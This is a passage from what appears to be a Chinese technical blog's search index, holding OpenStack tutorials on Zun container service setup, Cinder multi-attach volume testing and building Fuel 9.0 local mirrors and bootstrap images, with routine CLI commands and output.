      <link href="openstack/openstack-projext-zun.html"/>
      <url>openstack/openstack-projext-zun.html</url>
      
        <content type="html"><![CDATA[<h2 id="Zun-容器服务简介"><a href="#Zun-容器服务简介" class="headerlink" title="Zun 容器服务简介"></a>Zun 容器服务简介</h2><p>Zun 允许用户无需管理服务器或集群即可快速启动和运行容器。它通过与 Neutron 、Cinder、Keystone 和其他核心 OpenStack 服务集成，无缝地将先进的企业网络、存储和身份验证功能添加到容器中。<br>Zun目标在于解决 <a href="https://sunmite.com/docker/openstack-use-nova-docker-driver.html">Nova Docker driver方案</a>存在的问题，独立于 Nova 之外实现 Docker 部署调度框架，自身实现与 Glance、Neutron、Cinder等组件的集成，但并不实现对容器编排引擎（Container Orchestration Engines COE）的部署调度。Nova-docker通过Nova API访问容器，而Zun不受Nova API的限制。<br>Zun和Magnum的差异在于Zun目标是提供管理容器的API，而Magnum提供部署和管理容器编排引擎（COE）的API。Zun将容器作为Openstack管理的资源，为用户提供了创建和管理这些容器的接口。被Zun管理的容器和其他Openstack资源能够良好的集成在一起，例如Neutron网络和Cinder卷。用户使用统一的、简化的API接口来管理容器，而不需要关心不同容器技术的差异。<br>Zun不准备实现COE提供的很多先进的功能（例如容器保活、负载均衡等），而是提供基本的容器操作（CRUD），并和Openstack紧密集成。  </p><span id="more"></span><h2 id="使用-devstack-安装-Zun"><a href="#使用-devstack-安装-Zun" class="headerlink" title="使用 devstack 安装 Zun"></a>使用 devstack 安装 Zun</h2><p>local.conf 添加如下内容，运行 ./stack.sh</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">$ vim local.conf</span><br><span class="line"></span><br><span class="line">……</span><br><span class="line"><span class="comment">#Enable Zun plugin</span></span><br><span class="line">enable_plugin devstack-plugin-container http:<span class="regexp">//gi</span>t.trystack.cn<span class="regexp">/openstack/</span>devstack-plugin-container  <span class="comment">#安装docker，如果已经安装docker，可以忽略</span></span><br><span class="line">enable_plugin zun http:<span class="regexp">//gi</span>t.trystack.cn<span class="regexp">/openstack/</span>zun</span><br><span class="line">enable_plugin zun-ui http:<span class="regexp">//gi</span>t.trystack.cn<span class="regexp">/openstack/</span>zun-ui</span><br><span class="line">enable_plugin kuryr-libnetwork http:<span class="regexp">//gi</span>t.trystack.cn<span class="regexp">/openstack/</span>kuryr-libnetwork</span><br><span class="line">KURYR_CAPABILITY_SCOPE=local          <span class="comment">#单节点安装使用local，多节点要改为global</span></span><br><span class="line">KURYR_ETCD_PORT=<span class="number">2379</span></span><br></pre></td></tr></table></figure><h2 id="Zun-测试"><a href="#Zun-测试" class="headerlink" title="Zun 测试"></a>Zun 测试</h2><h3 id="1-Zun-ui-预览"><a href="#1-Zun-ui-预览" class="headerlink" title="1. Zun-ui 预览"></a>1. Zun-ui 预览</h3><p>创建 Container 的页面和创建虚拟机的页面类似。可以选择来自 DockerHub 或者 Glance 的镜像，可以选择网络、端口、安全组等，支持容器特有的一些功能如限制cpu和内存的使用<br><img data-src="/images/uploads/2018/03/create-container1.png" alt="image"><br><img data-src="/images/uploads/2018/03/create-container1.png" alt="image"></p><h3 id="2-创建容器"><a href="#2-创建容器" class="headerlink" title="2. 创建容器"></a>2. 创建容器</h3><p>考虑到 DockerHub 的龟速，先把镜像拉取到本地</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># docker pull cirros</span></span><br></pre></td></tr></table></figure><p>使用命令行创建一个 cirros 的容器</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">$ openstack appcontainer <span class="builtin-name">run</span> --name cirros --net <span class="attribute">network</span>=<span class="variable">$NET_ID</span> cirros</span><br></pre></td></tr></table></figure><h3 id="3-查看容器"><a href="#3-查看容器" class="headerlink" title="3. 查看容器"></a>3. 查看容器</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="comment"># openstack appcontainer list</span></span><br><span class="line">+<span class="params">--------------------------------------</span>+<span class="params">--------</span>+<span class="params">--------</span>+<span class="params">---------</span>+<span class="params">------------</span>+<span class="params">-----------</span>+<span class="params">-------</span>+</span><br><span class="line">| uuid                                 | name   | image  | status  | task_state | addresses | ports |</span><br><span class="line">+<span class="params">--------------------------------------</span>+<span class="params">--------</span>+<span class="params">--------</span>+<span class="params">---------</span>+<span class="params">------------</span>+<span class="params">-----------</span>+<span class="params">-------</span>+</span><br><span class="line">| 61dfa221-826b-496c-963a-e5222ca054a3 | cirros | cirros | Running | None       | 10.0.0.4  | []    |</span><br><span class="line">+<span class="params">--------------------------------------</span>+<span class="params">--------</span>+<span class="params">--------</span>+<span class="params">---------</span>+<span class="params">------------</span>+<span class="params">-----------</span>+<span class="params">-------</span>+</span><br></pre></td></tr></table></figure><h3 id="4-进入容器查看网络连接"><a href="#4-进入容器查看网络连接" class="headerlink" title="4. 进入容器查看网络连接"></a>4. 进入容器查看网络连接</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># openstack appcontainer exec --interactive cirros /bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># openstack appcontainer exec --interactive cirros /bin/sh</span></span><br><span class="line">connected <span class="keyword">to</span> container <span class="string">&quot;cirros&quot;</span></span><br><span class="line">type ~. <span class="keyword">to</span> disconnect</span><br><span class="line">/ #<span class="built_in"> ping </span>10.0.0.5                 # 10.0.0.5 为同一个网络的虚拟机，非容器</span><br><span class="line">PING 10.0.0.5 (10.0.0.5): 56 data bytes</span><br><span class="line">64 bytes <span class="keyword">from</span> 10.0.0.5: <span class="attribute">seq</span>=0 <span class="attribute">ttl</span>=64 <span class="attribute">time</span>=5.934 ms</span><br><span class="line">64 bytes <span class="keyword">from</span> 10.0.0.5: <span class="attribute">seq</span>=1 <span class="attribute">ttl</span>=64 <span class="attribute">time</span>=0.969 ms</span><br><span class="line">64 bytes <span class="keyword">from</span> 10.0.0.5: <span class="attribute">seq</span>=2 <span class="attribute">ttl</span>=64 <span class="attribute">time</span>=0.855 ms</span><br><span class="line">64 bytes <span class="keyword">from</span> 10.0.0.5: <span class="attribute">seq</span>=3 <span class="attribute">ttl</span>=64 <span class="attribute">time</span>=0.791 ms</span><br><span class="line">^C</span><br><span class="line">--- 10.0.0.5<span class="built_in"> ping </span>statistics ---</span><br><span class="line">4 packets transmitted, 4 packets received, 0% packet loss</span><br><span class="line">round-trip min/avg/max = 0.791/2.137/5.934 ms</span><br></pre></td></tr></table></figure><h3 id="5-dashboard上面的容器详情"><a href="#5-dashboard上面的容器详情" class="headerlink" title="5. dashboard上面的容器详情"></a>5. dashboard上面的容器详情</h3><p>在 dashboard 上面也可以查看容器的详细信息和 log 以及控制台，查看控制台需要容器以 interactive 模式启动<br><img data-src="/images/uploads/2018/03/details.png" alt="image"><br>对容器的一些基本操作：更新、停止、重启、暂停、执行命令、删除等操作<br><img data-src="/images/uploads/2018/03/command.png" alt="image"><br><img data-src="/images/uploads/2018/03/command1.png" alt="image"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Zun 的操作基本和 docker 的操作一致，使用起来和原生docker容器没有区别。但是现在可以和 Openstack 的资源良好的结合在一起，统一管理，提高的 OpenStack容器管理的灵活度，还是很令人期待的。</p><h2 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h2><h3 id="1-zun-compute-警告信息"><a href="#1-zun-compute-警告信息" class="headerlink" title="1. zun-compute 警告信息"></a>1. zun-compute 警告信息</h3><p>查看 <a href="mailto:&#x64;&#101;&#118;&#115;&#x74;&#97;&#99;&#x6b;&#64;&#122;&#x75;&#x6e;&#45;&#x63;&#111;&#x6d;&#112;&#117;&#x74;&#101;&#46;&#115;&#x65;&#114;&#x76;&#105;&#x63;&#101;">&#x64;&#101;&#118;&#115;&#x74;&#97;&#99;&#x6b;&#64;&#122;&#x75;&#x6e;&#45;&#x63;&#111;&#x6d;&#112;&#117;&#x74;&#101;&#46;&#115;&#x65;&#114;&#x76;&#105;&#x63;&#101;</a> 服务有如下警告：</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">$ journalctl -f --unit devstack@zun-compute.service</span><br><span class="line"></span><br><span class="line">Mar <span class="number">07</span> <span class="number">13</span>:<span class="number">51</span>:<span class="number">28</span> queens.domian.tld zun-compute[<span class="number">992</span>]: <span class="number">2018</span>-<span class="number">03</span>-<span class="number">07</span> <span class="number">13</span>:<span class="number">51</span>:<span class="number">28.172</span> DEBUG docker.auth [-] Trying paths: [<span class="string">&#x27;/opt/stack/.docker/config.json&#x27;</span>, <span class="string">&#x27;/opt/stack/.dockercfg&#x27;</span>] <span class="keyword">from</span> (pid=<span class="number">992</span>) find_config_file <span class="regexp">/usr/</span>lib<span class="regexp">/python2.7/</span>site-packages<span class="regexp">/docker/</span>auth.py:<span class="number">234</span></span><br><span class="line">Mar <span class="number">07</span> <span class="number">13</span>:<span class="number">51</span>:<span class="number">28</span> queens.domian.tld zun-compute[<span class="number">992</span>]: <span class="number">2018</span>-<span class="number">03</span>-<span class="number">07</span> <span class="number">13</span>:<span class="number">51</span>:<span class="number">28.173</span> DEBUG docker.auth [-] No config <span class="keyword">file</span> found <span class="keyword">from</span> (pid=<span class="number">992</span>) find_config_file <span class="regexp">/usr/</span>lib<span class="regexp">/python2.7/</span>site-packages<span class="regexp">/docker/</span>auth.py:<span class="number">241</span></span><br><span class="line">Mar <span class="number">07</span> <span class="number">13</span>:<span class="number">51</span>:<span class="number">28</span> queens.domian.tld zun-compute[<span class="number">992</span>]: <span class="number">2018</span>-<span class="number">03</span>-<span class="number">07</span> <span class="number">13</span>:<span class="number">51</span>:<span class="number">28.208</span> DEBUG zun.compute.manager [-] Complete syncing container states. <span class="keyword">from</span> (pid=<span class="number">992</span>) sync_container_state <span class="regexp">/opt/</span>stack<span class="regexp">/zun/</span>zun<span class="regexp">/compute/m</span>anager.py:<span class="number">951</span></span><br></pre></td></tr></table></figure><p>.docker/config.json 和 .dockercfg 是 docker login 成功后创建的文件。因为 Zun 可以直接从 DockerHub 拉取镜像，我们需要提供认证信息。</p><figure class="highlight pf"><table><tr><td class="code"><pre><span class="line">$ docker login</span><br><span class="line">Login with your Docker ID <span class="keyword">to</span> push and pull images <span class="keyword">from</span> Docker Hub. If you don&#x27;t have a Docker ID, head over <span class="keyword">to</span> https://hub.docker.com <span class="keyword">to</span> create one.</span><br><span class="line">Username: lovelonger           <span class="comment">#这里比较坑，只能写用户名，写邮箱一直登录失败</span></span><br><span class="line">Password: </span><br><span class="line">Login Succeeded</span><br></pre></td></tr></table></figure><h3 id="2-端口映射的问题"><a href="#2-端口映射的问题" class="headerlink" title="2. 端口映射的问题"></a>2. 端口映射的问题</h3><p>暂时不知道创建容器的时候怎么添加端口映射，如果容器创建在私有网络上面，上面的服务外部无法访问。</p>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> openstack </tag>
            
            <tag> zun </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenStack Queens Cinder Multi-Attach 功能</title>
      <link href="openstack/cinder-multi-attch.html"/>
      <url>openstack/cinder-multi-attch.html</url>
      
        <content type="html"><![CDATA[<p>OpenStack Queens 平台于2月28日正式发布，这是该开源云平台的第17版。OpenStack Queens 增加了多项新功能，也优化增强了多项旧功能，包括虚拟 GPU（ vGPU ）支持和容器集成的改进。几个新项目也在 OpenStack Queens 这一里程碑中露面，包括提供管理硬件和软件加速资源框架的Cyborg 。<br>Queens 发布了一些强大的面向企业的功能，其中最引人注目的是 Cinder 中的 Multi-Attach 功能。Cinder Multi-Attach 使运维者能够将相同的Cinder 卷加载到多个 VM 中。如果一个节点关闭，另一个节点能够接管并访问该卷。</p><span id="more"></span><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="1-安装-OpenStack-Queens"><a href="#1-安装-OpenStack-Queens" class="headerlink" title="1. 安装 OpenStack Queens"></a>1. 安装 OpenStack Queens</h3><p>使用 devstack 安装 openstack (stable/queens)，这里不再赘述。</p><h3 id="2-Cinder-需要满足的条件"><a href="#2-Cinder-需要满足的条件" class="headerlink" title="2. Cinder 需要满足的条件"></a>2. Cinder 需要满足的条件</h3><p>Multi-Attach 功能在 cinder microversion &gt;= 3.50 版本可用，查看 stable/queens 的cinder版本</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cinder --version</span></span><br><span class="line"><span class="attribute">3</span>.<span class="number">5</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="3-Nova-需要满足的条件"><a href="#3-Nova-需要满足的条件" class="headerlink" title="3. Nova 需要满足的条件"></a>3. Nova 需要满足的条件</h3><ul><li>nova api microversion版本高于或等于2.60<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"># nova version-list</span><br><span class="line">Client supported API versions:</span><br><span class="line">Minimum version 2.1</span><br><span class="line">Maximum version 2.53</span><br><span class="line"></span><br><span class="line">Server supported API versions:</span><br><span class="line"><span class="code">+------+</span>-----------<span class="code">+----------------------+</span>-------------<span class="code">+---------+</span></span><br><span class="line">| Id   | Status    | Updated              | Min Version | Version |</span><br><span class="line"><span class="code">+------+</span>-----------<span class="code">+----------------------+</span>-------------<span class="code">+---------+</span></span><br><span class="line">| v2.0 | SUPPORTED | 2011-01-21T11:33:21Z |             |         |</span><br><span class="line">| v2.1 | CURRENT   | 2013-07-23T11:33:21Z | 2.1         | 2.60    |</span><br><span class="line"><span class="code">+------+</span>-----------<span class="code">+----------------------+</span>-------------<span class="code">+---------+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>Cinder 12.0.0(Queens)或更高</li><li>nova-compute 服务必须运行的是 Queens release的代码版本，hypervisor 的驱动必须支持挂载卷设备到多个虚拟机。<figure class="highlight ldif"><table><tr><td class="code"><pre><span class="line">支持的驱动</span><br><span class="line"><span class="attribute">Libvirt KVM (s390x)</span>: complete</span><br><span class="line"><span class="attribute">Libvirt Virtuozzo CT</span>: missing</span><br><span class="line"><span class="attribute">Libvirt KVM (ppc64)</span>: complete</span><br><span class="line"><span class="attribute">Libvirt KVM (x86)</span>: complete</span><br><span class="line"><span class="attribute">Libvirt KVM (aarch64)</span>: unknown</span><br><span class="line"><span class="attribute">Libvirt LXC</span>: missing</span><br><span class="line"><span class="attribute">Hyper-V</span>: missing</span><br><span class="line"><span class="attribute">Libvirt QEMU (x86)</span>: complete</span><br><span class="line"><span class="attribute">XenServer</span>: missing</span><br><span class="line"><span class="attribute">Libvirt Virtuozzo VM</span>: complete</span><br><span class="line"><span class="attribute">Libvirt Xen</span>: complete</span><br><span class="line"><span class="attribute">PowerVM</span>: missing</span><br><span class="line"><span class="attribute">Ironic</span>: missing</span><br><span class="line"><span class="attribute">VMware vCenter</span>: missing</span><br></pre></td></tr></table></figure></li><li>当使用 libvirt 驱动的时候需要满足 libvirt &gt;= 3.10 或者 qemu &lt; 2.10<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># virsh --version</span></span><br><span class="line"><span class="attribute">3</span>.<span class="number">2</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># qemu-img --version</span></span><br><span class="line"><span class="attribute">qemu</span>-img version <span class="number">2</span>.<span class="number">9</span>.<span class="number">0</span>(qemu-kvm-ev-<span class="number">2</span>.<span class="number">9</span>.<span class="number">0</span>-<span class="number">16</span>.el<span class="number">7</span>_<span class="number">4</span>.<span class="number">13</span>.<span class="number">1</span>)</span><br><span class="line"><span class="attribute">Copyright</span> (c) <span class="number">2003</span>-<span class="number">2017</span> Fabrice Bellard and the QEMU Project developers</span><br></pre></td></tr></table></figure></li><li>不支持 Swapping 正在使用中的 multiattach 卷</li></ul><h3 id="4-Novaclient-版本-gt-9-1-1"><a href="#4-Novaclient-版本-gt-9-1-1" class="headerlink" title="4. Novaclient 版本 &gt; 9.1.1"></a>4. Novaclient 版本 &gt; 9.1.1</h3><p>== 测试中发现 novaclient 版本过低，无法调用 nova api 2.6版本，升级novaclient ==</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># pip install -U python-novaclient</span></span><br></pre></td></tr></table></figure><p>综上，本地环境满足上述要求，可以进行 Multi-Attach 测试。</p><h2 id="Multi-Attach-测试"><a href="#Multi-Attach-测试" class="headerlink" title="Multi-Attach 测试"></a>Multi-Attach 测试</h2><h3 id="1-创建-multiattach-的卷类型"><a href="#1-创建-multiattach-的卷类型" class="headerlink" title="1. 创建 multiattach 的卷类型"></a>1. 创建 multiattach 的卷类型</h3><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"># cinder type-<span class="keyword">create</span> multiattach</span><br><span class="line"># cinder <span class="built_in">type</span>-<span class="keyword">key</span> multiattach <span class="keyword">set</span> multiattach=<span class="string">&quot;&lt;is&gt; True&quot;</span></span><br></pre></td></tr></table></figure><h3 id="2-创建一个-10G-大小multiattach-卷"><a href="#2-创建一个-10G-大小multiattach-卷" class="headerlink" title="2. 创建一个 10G 大小multiattach 卷"></a>2. 创建一个 10G 大小multiattach 卷</h3><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="meta"># cinder create 10 --name multiattach-volume --volume-type <span class="meta-string">&lt;volume_type_uuid&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="3-创建两个测试虚拟机"><a href="#3-创建两个测试虚拟机" class="headerlink" title="3. 创建两个测试虚拟机"></a>3. 创建两个测试虚拟机</h3><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">#</span> <span class="comment">openstack</span> <span class="comment">server</span> <span class="comment">create</span> --<span class="comment">image</span>  <span class="comment">CentOS</span><span class="literal">-</span><span class="comment">7</span><span class="literal">-</span><span class="comment">x86_64</span> --<span class="comment">flavor</span> <span class="comment">ds1G</span> --<span class="comment">network</span> <span class="comment">private</span> <span class="comment">test01</span></span><br><span class="line"><span class="comment">#</span> <span class="comment">openstack</span> <span class="comment">server</span> <span class="comment">create</span> --<span class="comment">image</span>  <span class="comment">CentOS</span><span class="literal">-</span><span class="comment">7</span><span class="literal">-</span><span class="comment">x86_64</span> --<span class="comment">flavor</span> <span class="comment">ds1G</span> --<span class="comment">network</span> <span class="comment">private</span> <span class="comment">test02</span></span><br></pre></td></tr></table></figure><h3 id="4-挂载-multiattach-volume-到虚拟机-test01"><a href="#4-挂载-multiattach-volume-到虚拟机-test01" class="headerlink" title="4. 挂载 multiattach-volume 到虚拟机 test01"></a>4. 挂载 multiattach-volume 到虚拟机 test01</h3><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"># nova volume-attach test01 &lt;volume_uuid&gt;</span><br><span class="line"><span class="code">+----------+</span>--------------------------------------+</span><br><span class="line">| Property | Value                                |</span><br><span class="line"><span class="code">+----------+</span>--------------------------------------+</span><br><span class="line">| device   | /dev/vdb                             |</span><br><span class="line">| id       | ad8c6437-d842-40f7-b3d8-ee15d9623370 |</span><br><span class="line">| serverId | 972393a0-346e-419d-8933-2562290829cf |</span><br><span class="line">| volumeId | ad8c6437-d842-40f7-b3d8-ee15d9623370 |</span><br><span class="line"><span class="code">+----------+</span>--------------------------------------+</span><br></pre></td></tr></table></figure><h3 id="5-继续挂载multiattach-volume-到虚拟机-test02"><a href="#5-继续挂载multiattach-volume-到虚拟机-test02" class="headerlink" title="5. 继续挂载multiattach-volume 到虚拟机 test02"></a>5. 继续挂载multiattach-volume 到虚拟机 test02</h3><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"># nova volume-attach test02 &lt;volume_uuid&gt;</span><br><span class="line"><span class="code">+----------+</span>--------------------------------------+</span><br><span class="line">| Property | Value                                |</span><br><span class="line"><span class="code">+----------+</span>--------------------------------------+</span><br><span class="line">| device   | /dev/vdb                             |</span><br><span class="line">| id       | ad8c6437-d842-40f7-b3d8-ee15d9623370 |</span><br><span class="line">| serverId | 93b82c8e-4155-4ad5-9366-6eb2a9c9d34d |</span><br><span class="line">| volumeId | ad8c6437-d842-40f7-b3d8-ee15d9623370 |</span><br><span class="line"><span class="code">+----------+</span>--------------------------------------+</span><br></pre></td></tr></table></figure><h3 id="6-查看卷信息，可以看到有两个挂载信息"><a href="#6-查看卷信息，可以看到有两个挂载信息" class="headerlink" title="6. 查看卷信息，可以看到有两个挂载信息"></a>6. 查看卷信息，可以看到有两个挂载信息</h3><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cinder show ad8c6437-d842-40f7-b3d8-ee15d9623370</span></span><br><span class="line">+--------------------------------+----------------------------------------------------------------------------------+</span><br><span class="line">|<span class="string"> Property                       </span>|<span class="string"> Value                                                                            </span>|</span><br><span class="line">+--------------------------------+----------------------------------------------------------------------------------+</span><br><span class="line">|<span class="string"> attached_servers               </span>|<span class="string"> [&#x27;93b82c8e-4155-4ad5-9366-6eb2a9c9d34d&#x27;, &#x27;972393a0-346e-419d-8933-2562290829cf&#x27;] </span>|</span><br><span class="line">|<span class="string"> attachment_ids                 </span>|<span class="string"> [&#x27;bb764f56-b3bb-4a32-9859-5a25c8eb1287&#x27;, &#x27;deddf8b6-8b6c-4bb4-b309-7eb78d135637&#x27;] </span>|</span><br><span class="line">|<span class="string"> availability_zone              </span>|<span class="string"> nova                                                                             </span>|</span><br><span class="line">|<span class="string"> bootable                       </span>|<span class="string"> false                                                                            </span>|</span><br><span class="line">|<span class="string"> consistencygroup_id            </span>|<span class="string"> None                                                                             </span>|</span><br><span class="line">|<span class="string"> created_at                     </span>|<span class="string"> 2018-03-06T05:43:01.000000                                                       </span>|</span><br><span class="line">|<span class="string"> description                    </span>|<span class="string"> None                                                                             </span>|</span><br><span class="line">|<span class="string"> encrypted                      </span>|<span class="string"> False                                                                            </span>|</span><br><span class="line">|<span class="string"> id                             </span>|<span class="string"> ad8c6437-d842-40f7-b3d8-ee15d9623370                                             </span>|</span><br><span class="line">|<span class="string"> metadata                       </span>|<span class="string"> attached_mode : rw                                                               </span>|</span><br><span class="line">|<span class="string"> migration_status               </span>|<span class="string"> None                                                                             </span>|</span><br><span class="line">|<span class="string"> multiattach                    </span>|<span class="string"> True                                                                             </span>|</span><br><span class="line">|<span class="string"> name                           </span>|<span class="string"> multiattach-volume                                                               </span>|</span><br><span class="line">|<span class="string"> os-vol-host-attr:host          </span>|<span class="string"> queens.domian.tld@lvmdriver-1#lvmdriver-1                                        </span>|</span><br><span class="line">|<span class="string"> os-vol-mig-status-attr:migstat </span>|<span class="string"> None                                                                             </span>|</span><br><span class="line">|<span class="string"> os-vol-mig-status-attr:name_id </span>|<span class="string"> None                                                                             </span>|</span><br><span class="line">|<span class="string"> os-vol-tenant-attr:tenant_id   </span>|<span class="string"> ce5300160e244953bcfab8b9ebf06705                                                 </span>|</span><br><span class="line">|<span class="string"> replication_status             </span>|<span class="string"> None                                                                             </span>|</span><br><span class="line">|<span class="string"> size                           </span>|<span class="string"> 10                                                                               </span>|</span><br><span class="line">|<span class="string"> snapshot_id                    </span>|<span class="string"> None                                                                             </span>|</span><br><span class="line">|<span class="string"> source_volid                   </span>|<span class="string"> None                                                                             </span>|</span><br><span class="line">|<span class="string"> status                         </span>|<span class="string"> in-use                                                                           </span>|</span><br><span class="line">|<span class="string"> updated_at                     </span>|<span class="string"> 2018-03-06T06:16:44.000000                                                       </span>|</span><br><span class="line">|<span class="string"> user_id                        </span>|<span class="string"> 6b1155688e044f5899a5dd154fa269bd                                                 </span>|</span><br><span class="line">|<span class="string"> volume_type                    </span>|<span class="string"> multiattach                                                                      </span>|</span><br><span class="line">+--------------------------------+----------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>如图 test01 和 test02 都能查看到磁盘信息<br><img data-src="/images/uploads/2018/03/test01.png" alt="image"></p><p>接下来在 test02 上面创建分区挂载磁盘到 /mnt 并写入文件<br><img data-src="/images/uploads/2018/03/test02.png" alt="image"></p><p>接着关闭 test02 模拟出现故障，然后在 test01 上挂载分区，查看文件(可能需要手动刷新下分区表)<br><img data-src="/images/uploads/2018/03/test03.png" alt="image"></p><h2 id="Multi-Attach-一些说明"><a href="#Multi-Attach-一些说明" class="headerlink" title="Multi-Attach 一些说明"></a>Multi-Attach 一些说明</h2><p>RO/RW 警告(第二挂载 RW 权限的问题)<br>默认情况下第二次挂载的采用 read/write 模式， 会导致一些问题，尤其是卷迁移之类的操作，后期会有一些改进支持自定义第二个挂载的模式。</p><h2 id="已知问题"><a href="#已知问题" class="headerlink" title="已知问题"></a>已知问题</h2><ul><li>不支持调整一个 in-use 的卷从 multiattach 类型到非 multiattach 类型</li><li>如果一个 multiattach 卷有不止一个 R/W 模式的挂载正在使用中，不推荐进行 retype 操作。</li></ul>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> cinder </tag>
            
            <tag> Multi-Attach </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fuel 9.0 制作本地源、bootstrap以及升级9.2</title>
      <link href="openstack/fuel-something.html"/>
      <url>openstack/fuel-something.html</url>
      
        <content type="html"><![CDATA[<p>host-only 联网  </p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">iptables</span> -t nat -A POSTROUTING -s <span class="number">10.20.0.0</span>/<span class="number">24</span> -j MASQUERADE</span><br><span class="line"></span><br><span class="line"><span class="attribute">10</span>.<span class="number">20</span>.<span class="number">0</span>.<span class="number">0</span>/<span class="number">24</span> 为 host-only 网段</span><br></pre></td></tr></table></figure><h2 id="制作源"><a href="#制作源" class="headerlink" title="制作源"></a>制作源</h2><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"># vim /usr/share/fuel-mirror/ubuntu.yaml</span><br><span class="line"><span class="deletion">- ubuntu_baseurl: &amp;ubuntu_baseurl http://archive.ubuntu.com/ubuntu</span></span><br><span class="line"><span class="addition">+ ubuntu_baseurl: &amp;ubuntu_baseurl http://mirrors.aliyun.com/ubuntu</span></span><br><span class="line">mos_baseurl: &amp;mos_baseurl http://mirror.fuel-infra.org/mos-repos/ubuntu/$mos_version</span><br></pre></td></tr></table></figure><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># fuel-createmirror</span></span><br></pre></td></tr></table></figure><h2 id="bootstrap"><a href="#bootstrap" class="headerlink" title="bootstrap"></a>bootstrap</h2><h3 id="更换国内源"><a href="#更换国内源" class="headerlink" title="更换国内源"></a>更换国内源</h3><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"># vim /etc/fuel-bootstrap-cli/fuel_bootstrap_cli.yaml</span><br><span class="line"></span><br><span class="line">repos:</span><br><span class="line">    - name: ubuntu</span><br><span class="line">      section: &quot;main universe multiverse&quot;</span><br><span class="line"><span class="deletion">-     uri: &quot;http://archive.ubuntu.com/ubuntu&quot;</span></span><br><span class="line"><span class="addition">+     uri: &quot;http://mirrors.aliyun.com/ubuntu&quot;</span></span><br><span class="line">      priority:</span><br><span class="line">      suite: trusty</span><br><span class="line">      type: deb</span><br><span class="line">    - name: ubuntu-updates</span><br><span class="line">      section: &quot;main universe multiverse&quot;</span><br><span class="line"><span class="deletion">-     uri: &quot;http://archive.ubuntu.com/ubuntu&quot;</span></span><br><span class="line"><span class="addition">+     uri: &quot;http://mirrors.aliyun.com/ubuntu&quot;</span></span><br><span class="line">      priority:</span><br><span class="line">      suite: trusty-updates</span><br><span class="line">      type: deb</span><br><span class="line">    - name: ubuntu-security</span><br><span class="line">      section: &quot;main universe multiverse&quot;</span><br><span class="line"><span class="deletion">-      uri: &quot;http://archive.ubuntu.com/ubuntu&quot;</span></span><br><span class="line"><span class="addition">+      uri: &quot;http://mirrors.aliyun.com/ubuntu&quot;</span></span><br><span class="line">      priority:</span><br><span class="line">      suite: trusty-security</span><br><span class="line">      type: deb</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="开始制作-bootstrap"><a href="#开始制作-bootstrap" class="headerlink" title="开始制作 bootstrap"></a>开始制作 bootstrap</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># fuel-bootstrap build</span></span><br><span class="line"></span><br><span class="line">……</span><br><span class="line">Building initramfs</span><br><span class="line">Building squashfs</span><br><span class="line">squashfs_image clean-up</span><br><span class="line">Creating archive: <span class="regexp">/tmp/</span><span class="number">59129</span>ecd-cccd-<span class="number">4</span>a13-<span class="number">943</span>b-ed6000d2aa02.tar.gz</span><br><span class="line">--- Building bootstrap image <span class="keyword">END</span> (do_mkbootstrap) ---</span><br><span class="line">Cleanup chroot</span><br><span class="line">Bootstrap image <span class="number">59129</span>ecd-cccd-<span class="number">4</span>a13-<span class="number">943</span>b-ed6000d2aa02 has been built: <span class="regexp">/tmp/</span><span class="number">59129</span>ecd-cccd-<span class="number">4</span>a13-<span class="number">943</span>b-ed6000d2aa02.tar.gz</span><br></pre></td></tr></table></figure><h3 id="导入-bootstrap"><a href="#导入-bootstrap" class="headerlink" title="导入 bootstrap"></a>导入 bootstrap</h3><p>成功后在 /tmp/ 下有如下文件</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># ls <span class="regexp">/tmp/</span>*.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="regexp">/tmp/</span><span class="number">59129</span>ecd-cccd-<span class="number">4</span>a13-<span class="number">943</span>b-ed6000d2aa02.tar.gz</span><br></pre></td></tr></table></figure><p>导入 bootstrap</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># fuel-bootstrap import /tmp/59129ecd-cccd-4a13-943b-ed6000d2aa02.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Try</span> extract /tmp/<span class="number">59129</span>ecd-cccd-<span 